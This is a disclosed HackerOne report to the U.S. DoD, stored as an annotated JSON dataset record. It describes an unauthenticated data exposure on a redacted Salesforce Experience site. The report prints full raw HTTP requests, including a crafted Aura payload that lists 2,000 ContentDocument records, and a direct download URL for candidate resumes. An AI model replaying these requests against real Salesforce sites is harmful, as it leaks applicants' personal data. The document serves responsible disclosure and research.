@@ -1,0 +1,60 @@
+{
+    "reported_to": "U.S. Dept Of Defense",
+    "reported_by": "oxylis ",
+    "title": "Sensitive data exposure: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 candidate resumes/CVs available to download with no authentication through BAC/IDOR/Improper Salesforce config",
+    "content": "\nGreetings DoD team,\nI located a major example of sensitive data exposure through a BAC/incorrectly configured Salesforce instance.\nThe https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588.experience.\u2588\u2588\u2588/s/registration page allows the attacker to download any attachment (including thousands of resumes full of PII, university transcripts, and other sensitive files) submitted by other users through the Registration form. Potentially this might also affect files added by the \u2588\u2588\u2588\u2588\u2588\u2588\u2588 team manually.\nAt least several files are available (possibly many more); no authentication is required for this attack.\nImpact\nLarge-scale data breach/candidate PII leak.\nSystem Host(s)\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nAffected Product(s) and Version(s)\nCVE Numbers\nSteps to Reproduce\nSteps to reproduce:\nIn browser, navigate to: https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588.experience.\u2588\u2588\u2588\u2588\u2588\u2588/s/registration\nWithin Burp, find any POST request to the /aura endpoint, such as below. Send to Repeater:\nCode 2.37 KiB\n1POST /s/sfsites/aura?r=1&aura.ApexAction.execute=1 HTTP/1.1\n2Host: \u2588\u2588\u2588\u2588\u2588\u2588\u2588.experience.\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n3Cookie: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588; BrowserId=ztAOY0pSEe-h9wmd5-lRkA; pctrk=ccfad8a9-dcf3-4ab7-9a5f-f623cdbcd7b7\n4User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0\n5Accept: */*\n6Accept-Language: en-US,en;q=0.5\n7Accept-Encoding: gzip, deflate, br\n8Referer: https://\u2588\u2588\u2588\u2588.experience.\u2588\u2588\u2588\u2588\u2588\u2588\u2588/s/registration\n9X-Sfdc-Lds-Endpoints: ApexActionController.execute:RegistrationCtrl.getFileUploadRecord\n10X-Sfdc-Page-Scope-Id: 8f4f7425-7484-4329-b975-98c3bb386cfb\n11X-Sfdc-Request-Id: 326100000096dd5c96\n12X-Sfdc-Page-Cache: eec50ac11c34f2f4\n13Content-Type: application/x-www-form-urlencoded;charset=UTF-8\n14Content-Length: 1555\n15Origin: https://\u2588\u2588\u2588.experience.\u2588\u2588\u2588\u2588\n16Dnt: 1\n17Sec-Gpc: 1\n18Sec-Fetch-Dest: empty\n19Sec-Fetch-Mode: cors\n20Sec-Fetch-Site: same-origin\n21Te: trailers\n22Connection: close\n23\n24message=%7B%22actions%22%3A%5B%7B%22id%22%3A%2298%3Ba%22%2C%22descriptor%22%3A%22aura%3A%2F%2FApexActionController%2FACTION%24execute%22%2C%22callingDescriptor%22%3A%22UNKNOWN%22%2C%22params%22%3A%7B%22namespace%22%3A%22%22%2C%22classname%22%3A%22RegistrationCtrl%22%2C%22method%22%3A%22getFileUploadRecord%22%2C%22cacheable%22%3Afalse%2C%22isContinuation%22%3Afalse%7D%7D%5D%7D&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22WFIwUmVJdmtIRnI3MTFpX0d6c1VwQWhZX25NdHFVdGpDN3BnWlROY1ZGT3cyNTAuOC4zLTYuNC41%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%224aRXFMeJBEoyEhCBFKHHSA%22%2C%22COMPONENT%40markup%3A%2F%2Fforce%3AinputField%22%3A%22MIteSSSIxKghQgDJWuI57g%22%2C%22COMPONENT%40markup%3A%2F%2Fforce%3AoutputField%22%3A%224kDixPuHcKU99oJ3nGrYwA%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3AfeedPublisher%22%3A%22eLdMCU5TIIj5fTlBFHu9Cg%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3AforceCommunityFeed%22%3A%22T_JqvrMTIi87V9CzYeCoyQ%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3AobjectHome%22%3A%22XokhHoGbTrHekjpxgyja7A%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3ArecordDetail%22%3A%22DhqIX7zfLrAKT30H1SrJBQ%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3ArelatedRecords%22%3A%22QKutWURpjg1wirSmIlNoOQ%22%2C%22COMPONENT%40markup%3A%2F%2Finstrumentation%3Ao11ySecondaryLoader%22%3A%221JitVv-ZC5qlK6HkuofJqQ%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Afalse%7D&aura.pageURI=%2Fs%2Fregistration&aura.token=null\nModify the request as follows. This is a specifically crafted Aura payload that returns 2000 ContentDocument records (uploaded files). Send to Repeater and issue request:\nCode 2.37 KiB\n1POST /s/sfsites/aura?r=1&aura.ApexAction.execute=1 HTTP/1.1\n2Host: \u2588\u2588\u2588\u2588\u2588\u2588\u2588.experience.\u2588\u2588\u2588\u2588\u2588\u2588\n3Cookie: \u2588\u2588\u2588\u2588\u2588\u2588; BrowserId=ztAOY0pSEe-h9wmd5-lRkA; pctrk=ccfad8a9-dcf3-4ab7-9a5f-f623cdbcd7b7\n4User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0\n5Accept: */*\n6Accept-Language: en-US,en;q=0.5\n7Accept-Encoding: gzip, deflate, br\n8Referer: https://\u2588\u2588\u2588\u2588\u2588\u2588.experience.\u2588\u2588\u2588/s/registration\n9X-Sfdc-Lds-Endpoints: ApexActionController.execute:RegistrationCtrl.getFileUploadRecord\n10X-Sfdc-Page-Scope-Id: 8f4f7425-7484-4329-b975-98c3bb386cfb\n11X-Sfdc-Request-Id: 326100000096dd5c96\n12X-Sfdc-Page-Cache: eec50ac11c34f2f4\n13Content-Type: application/x-www-form-urlencoded;charset=UTF-8\n14Content-Length: 1554\n15Origin: https://\u2588\u2588\u2588\u2588\u2588\u2588.experience.\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n16Dnt: 1\n17Sec-Gpc: 1\n18Sec-Fetch-Dest: empty\n19Sec-Fetch-Mode: cors\n20Sec-Fetch-Site: same-origin\n21Te: trailers\n22Connection: close\n23\n24message={\"actions\":[{\"id\":\"123;a\",\"descriptor\":\"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems\",\"callingDescriptor\":\"UNKNOWN\",\"params\":{\"entityNameOrId\":\"ContentDocument\",\"layoutType\":\"FULL\",\"pageSize\":2000,\"currentPage\":0,\"useTimeout\":false,\"getCount\":false,\"enableRowActions\":false}}]}&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22WFIwUmVJdmtIRnI3MTFpX0d6c1VwQWhZX25NdHFVdGpDN3BnWlROY1ZGT3cyNTAuOC4zLTYuNC41%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%224aRXFMeJBEoyEhCBFKHHSA%22%2C%22COMPONENT%40markup%3A%2F%2Fforce%3AinputField%22%3A%22MIteSSSIxKghQgDJWuI57g%22%2C%22COMPONENT%40markup%3A%2F%2Fforce%3AoutputField%22%3A%224kDixPuHcKU99oJ3nGrYwA%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3AfeedPublisher%22%3A%22eLdMCU5TIIj5fTlBFHu9Cg%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3AforceCommunityFeed%22%3A%22T_JqvrMTIi87V9CzYeCoyQ%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3AobjectHome%22%3A%22XokhHoGbTrHekjpxgyja7A%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3ArecordDetail%22%3A%22DhqIX7zfLrAKT30H1SrJBQ%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3ArelatedRecords%22%3A%22QKutWURpjg1wirSmIlNoOQ%22%2C%22COMPONENT%40markup%3A%2F%2Finstrumentation%3Ao11ySecondaryLoader%22%3A%221JitVv-ZC5qlK6HkuofJqQ%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Afalse%7D&aura.pageURI=%2Fs%2Fregistration&aura.token=null\nExtract one of the IDs from the server response, e.g. 069830000028KJdAAM\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nInsert this ID into URL as below. This will download the attachment (confidential candidate resume) directly. All other files can be accessed using the same method.\nhttps://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588.experience.\u2588\u2588\u2588\u2588\u2588\u2588/sfsites/c/sfc/servlet.shepherd/document/download/069830000028KJdAAM\nHope you find this report helpful - look forward to your feedback.\nSuggested Mitigation/Remediation Actions\n\n",
+    "severity": [
+        7.0,
+        8.9
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "Improper Access Control - Generic"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1734569280,
+    "report_url": "https://hackerone.com/reports/2623715",
+    "is_multi_component": true,
+    "complexity": "HIGH",
+    "novelty": "MEDIUM",
+    "vuln_category": "WEB_APP",
+    "steps": [
+        [
+            1,
+            "Navigate to the registration page: https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588.experience.\u2588\u2588\u2588/s/registration"
+        ],
+        [
+            2,
+            "Intercept a POST request to the /aura endpoint using Burp Suite and send it to Repeater"
+        ],
+        [
+            3,
+            "Modify the request to craft a specific Aura payload that retrieves ContentDocument records (uploaded files)"
+        ],
+        [
+            4,
+            "Extract a file ID from the server response and use it to construct a download URL"
+        ],
+        [
+            5,
+            "Access the file directly via the constructed URL, e.g., https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588.experience.\u2588\u2588\u2588\u2588\u2588\u2588/sfsites/c/sfc/servlet.shepherd/document/download/069830000028KJdAAM"
+        ]
+    ],
+    "vuln_description": "The vulnerability involves a misconfigured Salesforce instance that allows unauthenticated access to sensitive files (e.g., resumes, transcripts) uploaded by users. By crafting specific Aura requests, an attacker can retrieve and download these files without any authentication, leading to a large-scale data breach.",
+    "reason": "The attack requires understanding Salesforce's Aura framework and crafting specific requests to exploit the misconfiguration. While the steps are methodical, the need to manipulate the Aura payload and understand the response structure adds complexity.",
+    "new_complexity": "MEDIUM",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null,
+    "idor_detectable": true,
+    "authnz_byppass_detectable": true,
+    "is_simple_payload": false,
+    "injection_metadata": {
+        "is_simple_payload": false
+    },
+    "authnz_metadata": {
+        "idor_detectable": true,
+        "authnz_byppass_detectable": true
+    }
+}
